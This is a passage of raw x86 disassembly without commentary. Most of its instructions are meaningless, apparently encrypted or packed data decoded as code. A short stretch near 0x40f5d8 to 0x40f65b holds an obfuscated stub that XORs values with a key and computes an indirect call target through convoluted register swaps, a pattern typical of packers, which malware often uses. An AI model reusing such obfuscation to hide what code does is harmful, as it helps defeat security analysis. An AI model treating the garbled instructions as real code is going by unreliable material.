  40f2a5:	sbb    cl,BYTE PTR [ebx]
  40f2a7:	jecxz  0x40f23a
  40f2a9:	int3   
  40f2aa:	shr    DWORD PTR ds:0x527e6589,cl
  40f2b0:	mov    bh,0x91
  40f2b2:	sbb    al,0xcb
  40f2b4:	mov    ch,0x43
  40f2b6:	dec    ebp
  40f2b7:	repnz out 0x4f,eax
  40f2ba:	(bad)  [edx]
  40f2bc:	mov    bl,0x20
  40f2be:	fs dec edi
  40f2c0:	inc    edx
  40f2c1:	cmc    
  40f2c2:	xor    edx,DWORD PTR [edi]
  40f2c4:	pushf  
  40f2c5:	mov    esi,0xf77fae57
  40f2ca:	and    al,0x6e
  40f2cd:	lods   al,BYTE PTR ds:[esi]
  40f2ce:	int    0x3a
  40f2d0:	dec    esp
  40f2d1:	mov    bh,0xd
  40f2d3:	jmp    0x4c42:0x602bb082
  40f2da:	dec    esp
  40f2db:	mov    eax,ds:0x30caa7c3
  40f2e0:	pop    edi
  40f2e1:	jo     0x40f264
  40f2e3:	rol    cl,1
  40f2e5:	in     eax,0x7b
  40f2e7:	stos   DWORD PTR es:[edi],eax
  40f2e8:	pop    eax
  40f2e9:	inc    ecx
  40f2ea:	ins    DWORD PTR es:[edi],dx
  40f2eb:	add    al,0xb0
  40f2ed:	mov    ecx,0xbcca6e51
  40f2f2:	sub    DWORD PTR [ecx+0xd4f424],edx
  40f2f8:	sbb    al,0xeb
  40f2fa:	fadd   DWORD PTR [eax+edx*1+0x6c]
  40f2fe:	aaa    
  40f2ff:	fdiv   DWORD PTR [ebx-0x48f89b22]
  40f305:	sub    al,0xad
  40f307:	cdq    
  40f308:	cmp    DWORD PTR [edx],esi
  40f30a:	jg     0x40f2ba
  40f30c:	sbb    ah,al
  40f30e:	shr    DWORD PTR [eax-0xb4453a6],cl
  40f314:	adc    eax,0x148d9b3a
  40f319:	add    dl,ch
  40f31b:	repz pop esi
  40f31d:	jae    0x40f373
  40f31f:	test   al,0x4b
  40f321:	xchg   esp,eax
  40f322:	pop    eax
  40f323:	mov    edi,0xac554650
  40f328:	lods   eax,DWORD PTR ds:[esi]
  40f329:	and    al,0xe
  40f32b:	clc    
  40f32c:	into   
  40f32d:	in     eax,dx
  40f32e:	es adc eax,0x28869eda
  40f334:	gs jne 0x40f2e9
  40f337:	pop    ecx
  40f338:	jno    0x40f2c2
  40f33a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f33b:	xchg   esi,eax
  40f33c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40f33e:	pop    ebx
  40f33f:	sti    
  40f340:	sar    DWORD PTR [edx+0x29538d60],cl
  40f346:	gs test bl,bl
  40f349:	mov    ds:0x4b053d6a,al
  40f34e:	cmp    BYTE PTR [bx+si],dl
  40f351:	cmp    DWORD PTR [eax+0x60],ebx
  40f354:	call   0x581a:0x142a477c
  40f35b:	hlt    
  40f35c:	ins    BYTE PTR es:[edi],dx
  40f35d:	cs loope 0x40f3de
  40f360:	sbb    DWORD PTR [ebx-0x5114008a],ebx
  40f366:	scas   al,BYTE PTR es:[edi]
  40f367:	mov    eax,ds:0x5e279a1f
  40f36c:	adc    edx,DWORD PTR [ecx]
  40f36e:	push   esp
  40f36f:	sbb    al,0x60
  40f371:	xor    BYTE PTR [esi],0x86
  40f374:	mov    ds:0x39539bef,eax
  40f379:	int3   
  40f37a:	or     al,0xf9
  40f37c:	xor    bh,BYTE PTR [ebx]
  40f37e:	and    eax,0x5bdcb161
  40f383:	std    
  40f384:	mov    esp,0x70a31284
  40f389:	(bad)  
  40f38a:	lods   eax,DWORD PTR ds:[esi]
  40f38b:	push   ebp
  40f38c:	xor    edi,DWORD PTR [edx+ebp*1+0x2d]
  40f390:	retf   
  40f391:	repz fst QWORD PTR [esi+0x6b]
  40f395:	popf   
  40f396:	out    dx,al
  40f397:	fidiv  DWORD PTR [edx+ebp*4]
  40f39a:	lfs    edx,FWORD PTR [ebx+0x12425c97]
  40f3a1:	jb     0x40f3dc
  40f3a3:	scas   al,BYTE PTR es:[edi]
  40f3a4:	idiv   DWORD PTR [ebx+0x3158e565]
  40f3aa:	int    0x1a
  40f3ac:	mov    ds:0x2ee80534,eax
  40f3b1:	les    ebx,FWORD PTR [ebx*1-0x19c23526]
  40f3b8:	xor    eax,0xcfc084ec
  40f3bd:	inc    di
  40f3bf:	imul   eax,DWORD PTR ss:[edx+ecx*4-0x40],0x7b5cbc42
  40f3c8:	popa   
  40f3c9:	loopne 0x40f3ce
  40f3cb:	or     esp,esp
  40f3cd:	mov    dh,0x95
  40f3cf:	lds    edi,FWORD PTR [esi-0x52d7004]
  40f3d5:	push   esp
  40f3d6:	jmp    0x6b8ea190
  40f3db:	mov    edi,0xb83632b1
  40f3e0:	adc    al,bh
  40f3e2:	cld    
  40f3e3:	pop    esp
  40f3e4:	xchg   edx,edi
  40f3e6:	mov    ds:0xcb4f78f6,al
  40f3eb:	inc    ecx
  40f3ec:	(bad)  
  40f3ed:	fsubr  QWORD PTR [ebx]
  40f3ef:	jecxz  0x40f41c
  40f3f1:	test   dl,ah
  40f3f3:	test   eax,0x26ebce2f
  40f3f8:	outs   dx,BYTE PTR ds:[esi]
  40f3f9:	test   al,0x64
  40f3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3fc:	push   ebp
  40f3fd:	sub    eax,0x87611474
  40f402:	in     al,dx
  40f403:	ss std 
  40f405:	inc    ebp
  40f406:	fcomp  DWORD PTR [ebx+0x15]
  40f409:	cmp    dl,bh
  40f40b:	fidivr DWORD PTR [eax]
  40f40d:	fbld   TBYTE PTR [edi+0x649ae4f0]
  40f413:	cmp    DWORD PTR [ebx+ebx*1+0x5eb39d3c],edx
  40f41a:	les    ecx,FWORD PTR [eax]
  40f41c:	mov    edi,DWORD PTR [ecx-0xffe4a82]
  40f422:	add    DWORD PTR [esi-0x1a],esp
  40f425:	loope  0x40f41d
  40f427:	ficom  WORD PTR [eax+eiz*1+0x5277339d]
  40f42e:	add    eax,0x78f68a0
  40f433:	shl    ecx,cl
  40f435:	xor    al,0x3c
  40f437:	inc    ecx
  40f438:	jns    0x40f40d
  40f43a:	int    0x6b
  40f43c:	sub    eax,eax
  40f43e:	xchg   ebp,eax
  40f43f:	and    edi,edx
  40f441:	adc    DWORD PTR [edi-0x50],0x5c
  40f445:	icebp  
  40f446:	mov    ss,WORD PTR [ecx+0x3f]
  40f449:	xchg   ebp,eax
  40f44a:	jecxz  0x40f413
  40f44c:	out    dx,eax
  40f44d:	adc    BYTE PTR [edx-0x42],0x5c
  40f451:	xchg   esi,eax
  40f452:	ins    BYTE PTR es:[edi],dx
  40f453:	iret   
  40f454:	pop    es
  40f455:	mov    edi,0x60c9e0df
  40f45a:	loope  0x40f4d2
  40f45c:	loopne 0x40f442
  40f45e:	shl    al,cl
  40f460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f461:	dec    ebx
  40f462:	xchg   esp,eax
  40f463:	or     ebp,ebx
  40f465:	and    eax,0x1a8f29ed
  40f46a:	xchg   esi,eax
  40f46b:	mov    ebp,DWORD PTR [ecx+0x36743383]
  40f471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f472:	fcmovnb st,st(2)
  40f474:	pop    esp
  40f475:	scas   al,BYTE PTR es:[edi]
  40f476:	cmp    dh,BYTE PTR [ecx-0x48]
  40f479:	arpl   si,di
  40f47b:	popf   
  40f47c:	adc    esi,DWORD PTR [ebx]
  40f47e:	mov    esi,0x9ba6be1a
  40f483:	xor    eax,0x3780a314
  40f488:	(bad)  
  40f489:	xchg   ebp,eax
  40f48a:	push   0xffffffd2
  40f48c:	adc    al,0xa2
  40f48e:	loopne 0x40f494
  40f490:	lods   eax,DWORD PTR ds:[esi]
  40f491:	ror    BYTE PTR [eax-0x6d],0x3d
  40f495:	dec    edi
  40f496:	adc    bl,dh
  40f498:	(bad)
  40f49b:	test   al,0xee
  40f49d:	mov    ah,0x93
  40f49f:	(bad)  
  40f4a0:	mov    ch,0x37
  40f4a2:	(bad)  
  40f4a3:	cmp    dl,bl
  40f4a5:	nop
  40f4a6:	adc    bl,ch
  40f4a8:	(bad)  
  40f4a9:	ss push edi
  40f4ab:	mov    esi,0x2372417c
  40f4b0:	shl    ch,cl
  40f4b2:	loop   0x40f4eb
  40f4b4:	inc    ecx
  40f4b5:	sbb    eax,0xde4b7d99
  40f4ba:	xchg   esi,eax
  40f4bb:	cli    
  40f4bc:	sub    BYTE PTR [ebp-0x2a],0x7a
  40f4c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4c1:	test   eax,0xe8313604
  40f4c6:	nop
  40f4c7:	jne    0x40f505
  40f4c9:	iret   
  40f4ca:	dec    edi
  40f4cb:	xor    ebx,DWORD PTR [edi]
  40f4cd:	xlat   BYTE PTR ds:[ebx]
  40f4ce:	xor    dh,BYTE PTR [edi+0xb2e4fe7]
  40f4d4:	loopne 0x40f4ac
  40f4d6:	push   0x55
  40f4d8:	add    BYTE PTR [edx],dh
  40f4da:	lahf   
  40f4db:	or     DWORD PTR [ecx+eax*8+0x18],ecx
  40f4df:	bnd ja 0x40f526
  40f4e2:	mov    ds:0xeef8689e,eax
  40f4e7:	xlat   BYTE PTR ds:[ebx]
  40f4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e9:	sbb    al,BYTE PTR [eax]
  40f4eb:	inc    ebp
  40f4ec:	outs   dx,DWORD PTR ds:[esi]
  40f4ed:	mov    ah,0x5d
  40f4ef:	ret    
  40f4f0:	mov    esp,eax
  40f4f2:	sbb    eax,0xfa580956
  40f4f7:	dec    ebp
  40f4f8:	outs   dx,BYTE PTR ds:[esi]
  40f4f9:	mov    edx,0xc968a2fe
  40f4fe:	mov    WORD PTR [ebp+0x579d1361],?
  40f504:	adc    esi,esp
  40f506:	(bad)  
  40f507:	xor    eax,0xce9151ec
  40f50c:	adc    DWORD PTR [eax+0x68],edx
  40f50f:	inc    edi
  40f510:	mov    esp,0x7b8c2923
  40f515:	loop   0x40f4bc
  40f517:	mov    ecx,0x6301b42c
  40f51c:	and    DWORD PTR ds:0xb028c87,edi
  40f522:	in     al,0x28
  40f524:	fnstsw WORD PTR [edi-0x26]
  40f527:	jl     0x40f4d3
  40f529:	lods   eax,DWORD PTR ds:[esi]
  40f52a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f52b:	sub    eax,0xa1537729
  40f530:	cmp    dl,BYTE PTR fs:[esi+0x3a5673bb]
  40f537:	hlt    
  40f538:	mov    WORD PTR [ebx+0x54],gs
  40f53b:	mov    BYTE PTR [esi+eiz*2+0x1e],dl
  40f53f:	lods   eax,DWORD PTR ds:[esi]
  40f540:	xchg   edx,eax
  40f541:	sbb    eax,0xfa7bd4be
  40f546:	retf   0x17f6
  40f549:	test   DWORD PTR [edx+edi*2-0x4c],ecx
  40f54d:	les    ecx,FWORD PTR [ebx+0x2c830d64]
  40f553:	lock into 
  40f555:	pop    ds
  40f556:	xchg   edi,eax
  40f557:	xlat   BYTE PTR ds:[ebx]
  40f558:	xlat   BYTE PTR ds:[ebx]
  40f559:	push   ecx
  40f55a:	xor    ebx,DWORD PTR [edx+0x32cdca7]
  40f560:	mov    bh,0x17
  40f562:	and    al,0x37
  40f564:	inc    esp
  40f565:	sub    DWORD PTR [edx-0x3f],eax
  40f568:	adc    bh,BYTE PTR [esi]
  40f56a:	mov    ds:0x72d1e09b,al
  40f56f:	pop    ecx
  40f570:	bound  eax,QWORD PTR [esi-0x71]
  40f573:	mov    ebp,0xff7f8e33
  40f578:	into   
  40f579:	sbb    BYTE PTR [esi-0x3f92dfb4],bh
  40f57f:	stc    
  40f580:	ret    0xb60f
  40f583:	out    0xaa,eax
  40f585:	aad    0x88
  40f587:	inc    edx
  40f588:	outs   dx,DWORD PTR ds:[esi]
  40f589:	push   eax
  40f58a:	sub    al,0x18
  40f58c:	cmp    eax,0xbf45a826
  40f592:	imul   edi,DWORD PTR [esi+0x45],0x42
  40f596:	dec    edi
  40f597:	xlat   BYTE PTR ds:[ebx]
  40f598:	jbe    0x40f5f5
  40f59a:	jae    0x40f5d2
  40f59c:	push   eax
  40f59d:	adc    ah,BYTE PTR [edx-0x37e0355b]
  40f5a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5a4:	xor    BYTE PTR [ebx-0x2a],ch
  40f5a7:	mov    ebx,0x23319f4f
  40f5ac:	popf   
  40f5ad:	push   esp
  40f5ae:	retf   0xa6a9
  40f5b1:	and    DWORD PTR [esi+0x17],0x16
  40f5b5:	cmp    bh,BYTE PTR [ebp-0x18]
  40f5b8:	push   eax
  40f5b9:	push   es
  40f5ba:	xchg   edi,eax
  40f5bb:	sbb    ah,bl
  40f5bd:	adc    dl,BYTE PTR [ecx+0x10]
  40f5c0:	push   eax
  40f5c1:	jns    0x40f5a7
  40f5c3:	jo     0x40f5e7
  40f5c5:	mov    ebp,0x848dce33
  40f5ca:	add    ecx,esi
  40f5cc:	jb     0x40f600
  40f5ce:	add    BYTE PTR [ebx+0x558b084d],cl
  40f5d4:	loopne 0x40f55f
  40f5d6:	add    al,0x8a
  40f5d8:	mov    eax,DWORD PTR [ebp-0xc]
  40f5db:	mov    ecx,DWORD PTR [ebp+0x8]
  40f5de:	xor    eax,esi
  40f5e0:	lea    eax,[eax+ecx*1+0x3272f1]
  40f5e7:	mov    DWORD PTR [ebp+0x8],eax
  40f5ea:	mov    eax,DWORD PTR [ebp-0xc]
  40f5ed:	mov    ecx,DWORD PTR [ebp+0x14]
  40f5f0:	xor    eax,esi
  40f5f2:	add    eax,edi
  40f5f4:	imul   eax,DWORD PTR [ecx]
  40f5f7:	mov    ecx,DWORD PTR [ebp-0x4]
  40f5fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f5fd:	xor    ecx,esi
  40f5ff:	lea    ecx,[ecx+edx*1+0x3272f1]
  40f606:	cmp    ecx,eax
  40f608:	jne    0x40d220
  40f60e:	mov    eax,DWORD PTR [ebp-0x4]
  40f611:	xor    eax,esi
  40f613:	add    eax,edi
  40f615:	mov    DWORD PTR [ebp-0x10],eax
  40f618:	mov    ebx,0x65655
  40f61d:	add    ebx,0x3234
  40f623:	xchg   ebx,esi
  40f625:	xor    ebx,ebx
  40f627:	push   esi
  40f628:	mov    esi,ebx
  40f62a:	pop    ebx
  40f62b:	mov    edx,esi
  40f62d:	add    ebx,0x1002
  40f633:	lea    eax,[ebp-0x18]
  40f636:	add    edx,eax
  40f638:	add    edx,0x5
  40f63b:	push   edx
  40f63c:	inc    esi
  40f63d:	pop    ecx
  40f63e:	dec    ecx
  40f63f:	xchg   ecx,eax
  40f640:	dec    eax
  40f641:	xchg   ecx,eax
  40f642:	dec    ecx
  40f643:	xchg   ecx,edx
  40f645:	dec    edx
  40f646:	push   edx
  40f647:	mov    edx,ebx
  40f649:	pop    ebx
  40f64a:	dec    ebx
  40f64b:	call   DWORD PTR [ebx]
  40f64d:	cmp    DWORD PTR [ebp+0x10],esi
  40f650:	je     0x413d8d
  40f656:	xchg   edx,eax
  40f657:	push   0xc
  40f659:	pop    ecx
  40f65a:	dec    ecx
  40f65b:	jmp    0x4119e9
  40f660:	test   al,0x3a
  40f662:	jl     0x40f606
  40f664:	out    dx,al
  40f665:	mov    ds:0xdb3d32a2,al
  40f66a:	sti    
  40f66b:	loopne 0x40f6b8
  40f66d:	mov    cl,bl
  40f66f:	dec    edi
  40f670:	jp     0x40f621
  40f672:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffe4
  40f679:	dec    esi
  40f67a:	gs sub al,0xe2
  40f67d:	repz mov dh,0xf0
  40f680:	sbb    BYTE PTR [ebp-0x48],0xb2
  40f684:	pushf  
  40f685:	mov    ebp,0x865485fe
  40f68a:	sub    al,0xca
  40f68c:	push   ss
  40f68d:	lea    edi,[ebp-0x43568915]
  40f693:	pop    ebx
  40f694:	xor    al,0xb9
  40f696:	mov    bh,0xb1
  40f698:	sar    BYTE PTR ds:0xbc193ab6,cl
  40f69e:	mov    BYTE PTR [eax+esi*1-0x1d503f31],0xff
  40f6a6:	ins    BYTE PTR es:[edi],dx
  40f6a7:	or     eax,0xdf60fe67
  40f6ac:	pop    ecx
  40f6ad:	call   0x9f79:0x66d4d9a8
  40f6b4:	adc    ebx,DWORD PTR [eax+eax*4+0x303d9612]
  40f6bb:	les    ebp,FWORD PTR [edi]
  40f6bd:	fcomp  QWORD PTR [ebx]
  40f6bf:	cmp    eax,0x521da9d0
  40f6c4:	cmp    DWORD PTR [ecx-0x7b],ebx
  40f6c7:	lds    edx,FWORD PTR [eax]
  40f6c9:	or     ah,dl
  40f6cb:	dec    BYTE PTR [ebp+0x226af9d7]
  40f6d1:	or     edx,DWORD PTR [ebx+0xd3f0706]
  40f6d7:	pop    edi
  40f6d8:	jecxz  0x40f689
  40f6da:	adc    al,0xf
  40f6dc:	popa   
  40f6dd:	mov    ebp,0xe7c37a15
  40f6e2:	gs icebp 
  40f6e4:	leave  
  40f6e5:	lods   eax,DWORD PTR ds:[esi]
  40f6e6:	or     edx,DWORD PTR [edx+0x39e092ef]
  40f6ec:	sbb    BYTE PTR [esi+0x7d],ch
  40f6ef:	sbb    al,0x19
  40f6f1:	mov    dh,0xc0
  40f6f3:	(bad)  
  40f6f4:	dec    BYTE PTR [edi]
  40f6f6:	in     eax,dx
  40f6f7:	imul   edi,DWORD PTR [ebx+0x7e],0xdb01bfd7
  40f6fe:	pushf  
  40f6ff:	sub    eax,0xd7dcadab
  40f704:	jae    0x40f74b
  40f706:	push   es
  40f707:	lds    eax,FWORD PTR [ecx]
  40f709:	inc    eax
  40f70a:	(bad)  
  40f70b:	xchg   edi,eax
  40f70c:	cmc    
  40f70d:	dec    edx
  40f70e:	mov    bh,0x36
  40f710:	pop    esp
  40f711:	dec    ebx
  40f712:	clc    
  40f713:	addr16 jo 0x40f780
  40f716:	call   0xe4f9:0xdae7c629
  40f71d:	dec    ecx
  40f71e:	xchg   esp,eax
  40f71f:	add    dh,BYTE PTR [eax]
  40f721:	repnz sbb eax,0x685cd7df
  40f727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f728:	pop    eax
  40f729:	in     al,dx
  40f72a:	inc    edi
  40f72b:	jnp    0x40f72d
  40f72d:	push   es
  40f72e:	push   ebx
  40f72f:	sub    eax,0x8267682b
  40f734:	ja     0x40f6bb
  40f736:	mov    ecx,0x70d56f8e
  40f73b:	push   ebx
  40f73c:	dec    esi
  40f73d:	pop    edx
  40f73e:	mov    al,0xb8
  40f740:	fsubr  QWORD PTR [edi+edi*1+0x64a0bf58]
  40f747:	test   al,0xb
  40f749:	xchg   esp,eax
  40f74a:	frstor [eax+ebx*8+0x36]
  40f74e:	scas   al,BYTE PTR es:[edi]
  40f74f:	jmp    0xb8492e21
  40f754:	in     al,0x7f
  40f756:	repz add DWORD PTR [eax+0x57],esi
  40f75a:	(bad)  
  40f75b:	xor    eax,0xad5b55d6
  40f760:	push   es
  40f761:	cmp    BYTE PTR [ecx+0x6a],bh
  40f764:	adc    DWORD PTR [ebp-0x3d8646d3],0x16
  40f76b:	outs   dx,DWORD PTR ds:[esi]
  40f76c:	xor    eax,0xca3015e
  40f771:	cmp    BYTE PTR [edi],cl
  40f773:	lock fs jno 0x40f77b
  40f777:	aam    0x59
  40f779:	cmp    bl,BYTE PTR ds:0x7e931fae
  40f77f:	sub    al,0x16
  40f781:	shr    DWORD PTR [ecx+0x4c],1
  40f784:	mov    ebx,0xa0c2b368
  40f789:	adc    eax,0x3e38c357
  40f78e:	fwait
  40f78f:	retf   0x2930
  40f792:	mov    WORD PTR ds:0x4cccc08d,?
  40f798:	cmp    dl,BYTE PTR [ebp+0x4]
  40f79b:	or     dl,0xa
  40f79e:	pop    ss
  40f79f:	lahf   
  40f7a0:	jne    0x40f7c1
  40f7a2:	push   0xaf5db0b
  40f7a7:	ror    ebx,cl
  40f7a9:	jbe    0x3556564f
  40f7af:	add    al,0x79
  40f7b1:	xchg   edi,eax
  40f7b2:	cmc    
  40f7b3:	sub    dh,ch
  40f7b5:	xchg   ebx,eax
  40f7b6:	mov    BYTE PTR [ecx+0x17],ah
  40f7b9:	pop    es
  40f7ba:	adc    al,0x88
  40f7bc:	sahf   
  40f7bd:	add    al,0xb3
  40f7bf:	xchg   edi,eax
  40f7c0:	push   edx
  40f7c1:	outs   dx,BYTE PTR ds:[esi]
  40f7c2:	adc    BYTE PTR [ecx+0x1b],cl
  40f7c5:	imul   ebx,DWORD PTR [esi-0x7171d9b],0x5e
  40f7cc:	sub    al,0x54
  40f7ce:	cmp    BYTE PTR [eax-0x39],cl
  40f7d1:	addr16 mov al,0x7e
  40f7d4:	repz aad 0xa6
  40f7d7:	loop   0x40f7aa
  40f7d9:	and    DWORD PTR [esi+0x48],ebp
  40f7dc:	inc    ecx
  40f7dd:	mov    edx,0x1a6432e4
  40f7e2:	cmp    bh,ah
  40f7e4:	retf   
  40f7e5:	pop    esp
  40f7e6:	push   cs
  40f7e7:	xchg   ecx,eax
  40f7e8:	(bad)  
  40f7e9:	mov    DWORD PTR [ebp-0x6e8d634a],ebx
  40f7ef:	in     eax,0x49
  40f7f1:	dec    ecx
  40f7f2:	pop    ecx
  40f7f3:	mov    ebx,0xf32782ba
  40f7f8:	cmp    edx,DWORD PTR [ebx]
  40f7fa:	outs   dx,BYTE PTR ds:[esi]
  40f7fb:	in     al,dx
  40f7fc:	mov    ecx,0xcee32126
  40f801:	sub    esi,DWORD PTR [esi-0x5a]
  40f804:	push   0x61
  40f806:	rcl    DWORD PTR [eax-0x62],cl
  40f809:	pop    eax
  40f80a:	fstp   st(2)
  40f80c:	mov    ?,WORD PTR [eax+0x731f62]
  40f812:	mov    dl,0x18
  40f814:	sbb    ecx,ecx
  40f816:	push   edx
  40f817:	cmp    bh,bh
  40f819:	dec    eax
  40f81a:	or     al,0x5d
  40f81c:	mov    esp,DWORD PTR [eax-0x183648e7]
  40f822:	scas   al,BYTE PTR es:[edi]
  40f823:	aad    0x9f
  40f825:	inc    edi
  40f826:	mov    edi,?
  40f828:	out    0xa1,eax
  40f82a:	clc    
  40f82b:	popa   
  40f82c:	jbe    0x40f895
  40f82e:	clc    
  40f82f:	xchg   esp,eax
  40f830:	call   0xafae89fe
  40f835:	cmp    BYTE PTR [esi+0x500ac665],ch
  40f83b:	imul   esi,DWORD PTR [ebx+edi*2-0x654507bc],0xa7221783
  40f846:	and    BYTE PTR [eax],bl
  40f848:	jg     0x40f7d7
  40f84a:	in     eax,dx
  40f84b:	pop    ds
  40f84c:	out    dx,eax
  40f84d:	add    BYTE PTR [ecx-0x44],bl
  40f850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f851:	mov    edx,0x723b1f9d
  40f856:	call   DWORD PTR [eax-0x3a]
  40f859:	jmp    0xa9ae0cdd
  40f85e:	loop   0x40f832
  40f860:	fs ret 0x3856
  40f864:	call   0x28e0bea1
  40f869:	jnp    0x40f8db
  40f86b:	outs   dx,BYTE PTR ds:[esi]
  40f86c:	or     BYTE PTR gs:[ebp+ebx*2-0x5b],0xe
  40f872:	out    dx,al
  40f873:	out    0x42,al
  40f875:	clc    
  40f876:	outs   dx,BYTE PTR ds:[esi]
  40f877:	mov    esp,DWORD PTR [ebx+eax*1+0x53c6a84]
  40f87e:	test   DWORD PTR [ebp+ecx*8-0x3a574661],edi
  40f885:	iret   
  40f886:	leave  
  40f887:	mov    DWORD PTR [esi-0x146086a9],esi
  40f88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f88e:	adc    dh,BYTE PTR ds:0xb8455670
  40f894:	add    eax,0x3db87bd7
  40f899:	sub    BYTE PTR [eax],0xdc
  40f89c:	daa    
  40f89d:	jge    0x40f8c1
  40f89f:	xor    al,0xec
  40f8a1:	push   edx
  40f8a2:	xor    ebx,DWORD PTR [edx-0x45ce4e83]
  40f8a8:	je     0x40f90a
  40f8aa:	jge    0x40f833
  40f8ac:	sub    BYTE PTR [edi-0x6a],0x8f
  40f8b0:	jmp    0x3548:0xac02eff5
  40f8b7:	inc    ebx
  40f8b8:	iret   
  40f8b9:	cmp    BYTE PTR [edx],cl
  40f8bb:	shl    BYTE PTR [edx],0x7
  40f8be:	fsubr  QWORD PTR [ebx-0x7e95c2f]
  40f8c4:	push   ebx
  40f8c5:	jns    0x40f8b2
  40f8c7:	ret    
  40f8c8:	loop   0x40f8a4
  40f8ca:	out    0xa,eax
  40f8cc:	push   ss
  40f8cd:	int3   
  40f8ce:	ins    DWORD PTR es:[edi],dx
  40f8cf:	sub    al,cl
  40f8d1:	je     0x40f86e
  40f8d3:	shl    BYTE PTR [esi+ecx*4-0x1d],0x78
  40f8d8:	fwait
  40f8d9:	dec    esp
  40f8da:	fist   WORD PTR [ebp-0x46]
  40f8dd:	dec    edi
  40f8de:	xchg   ebp,eax
  40f8df:	mov    ebx,0x556cfd23
  40f8e4:	dec    edx
  40f8e5:	test   eax,0x2b7ac5a
  40f8ea:	dec    ebx
  40f8eb:	iret   
  40f8ec:	mov    eax,ds:0x97121674
  40f8f1:	shl    DWORD PTR [ebp-0x49],cl
  40f8f4:	mov    gs,WORD PTR [edx]
  40f8f6:	jecxz  0x40f8bf
  40f8f8:	lock jmp 0x40f8d3
  40f8fb:	icebp  
  40f8fc:	shr    BYTE PTR [ebx+edi*8],cl
  40f8ff:	hlt    
  40f900:	test   al,0x45
  40f902:	call   0x9ba2:0x732f8762
  40f909:	aam    0x1d
  40f90b:	mov    dl,0xf0
  40f90d:	xchg   esi,eax
  40f90e:	jecxz  0x40f8c4
  40f910:	popa   
  40f911:	sahf   
  40f912:	inc    edx
  40f913:	push   ecx
  40f914:	mov    al,ds:0x7c9936ac
  40f919:	xor    BYTE PTR [esi+0x33],cl
  40f91c:	xor    ebx,DWORD PTR [esi-0x5e]
  40f91f:	push   ebp
  40f920:	cmp    DWORD PTR [ecx],0xffffff83
  40f923:	adc    eax,0x50d77b53
  40f928:	xor    BYTE PTR [edx+0x59],0x51
  40f92c:	cmp    dh,BYTE PTR ds:0x50cd4084
  40f932:	cli    
  40f933:	nop
  40f934:	push   0xffffffc0
  40f936:	iret   
  40f937:	(bad)  
  40f939:	hlt    
  40f93a:	mov    ds:0xc2e0fee1,eax
  40f93f:	push   ebx
  40f940:	outs   dx,BYTE PTR ds:[esi]
  40f941:	lds    esp,FWORD PTR [ebp+ebp*2+0x6c]
  40f945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f946:	ds jno 0x40f90a
  40f949:	(bad)  
  40f94a:	pop    ss
  40f94b:	test   al,0xf0
  40f94d:	outs   dx,BYTE PTR ds:[esi]
  40f94e:	mov    ecx,0xcb1fa56d
  40f953:	pop    edx
  40f954:	push   ecx
  40f955:	push   es
  40f956:	inc    esp
  40f957:	shl    BYTE PTR [esi],cl
  40f959:	pusha  
  40f95a:	xchg   BYTE PTR [edx+0x45a2ede7],dh
  40f960:	sub    al,0xc1
  40f962:	call   0xfd571681
  40f967:	(bad)  ds:0x50db1d8
  40f96d:	mov    dh,0xac
  40f96f:	cmp    BYTE PTR [esi-0x72],al
  40f972:	lds    eax,FWORD PTR [edi+ebx*8]
  40f975:	pusha  
  40f976:	mov    ?,WORD PTR [edi-0x1a]
  40f979:	xchg   ebx,eax
  40f97a:	adc    bh,ch
  40f97c:	dec    edx
  40f97d:	lds    eax,FWORD PTR [ebx-0x62898aa6]
  40f983:	(bad)  
  40f984:	mov    ds:0x7a3790a2,eax
  40f989:	repnz int 0x4d
  40f98c:	leave  
  40f98d:	aas    
  40f98e:	jnp    0x40f9b6
  40f990:	xor    DWORD PTR [eax+0x5e],esp
  40f993:	xlat   BYTE PTR ds:[ebx]
  40f994:	sub    al,0xf2
  40f996:	or     al,0x1e
  40f998:	xor    eax,0xa9add2e0
  40f99d:	outs   dx,BYTE PTR ds:[esi]
  40f99e:	fsubr  st(5),st
  40f9a0:	jns    0x40fa06
  40f9a2:	retf   
  40f9a3:	jmp    0xa03d490e
  40f9a8:	retf   0x93c9
  40f9ab:	ss jbe 0x40fa27
  40f9ae:	sub    al,0x41
  40f9b0:	or     eax,0x22c83dcf
  40f9b5:	inc    ebp
  40f9b6:	push   edx
  40f9b7:	int    0xb3
  40f9b9:	outs   dx,BYTE PTR ds:[esi]
  40f9ba:	out    0x9,eax
  40f9bc:	lahf   
  40f9bd:	mov    eax,esp
  40f9bf:	or     eax,0x80aaa6b9
  40f9c4:	mov    ebx,0xa86e3515
  40f9c9:	adc    BYTE PTR [ecx],cl
  40f9cb:	loop   0x40fa2c
  40f9cd:	jae    0x40fa0f
  40f9cf:	inc    ebp
  40f9d0:	lds    ebx,FWORD PTR [esi+0x3d]
  40f9d3:	mov    BYTE PTR [eax+0x5864a545],al
  40f9d9:	xchg   DWORD PTR [ecx],esi
  40f9db:	lea    ebp,[eax]
  40f9dd:	ss test al,0x47
  40f9e0:	je     0x40f972
  40f9e2:	fist   DWORD PTR [ecx]
  40f9e4:	cld    
  40f9e5:	push   ebp
  40f9e6:	jno    0x40fa02
  40f9e8:	jge    0x40f9c4
  40f9ea:	xchg   esi,eax
  40f9eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ec:	(bad)
  40f9ef:	cs sub eax,0x9ca6726f
  40f9f5:	sbb    cl,BYTE PTR [esi-0x72]
  40f9f8:	push   esi
  40f9f9:	ss addr16 pop ebp
  40f9fc:	mov    BYTE PTR [eax+ecx*8],cl
  40f9ff:	hlt    
  40fa00:	xchg   ebp,eax
  40fa01:	jle    0x40f9d6
  40fa03:	mov    ch,0x97
  40fa05:	jae    0x40fa65
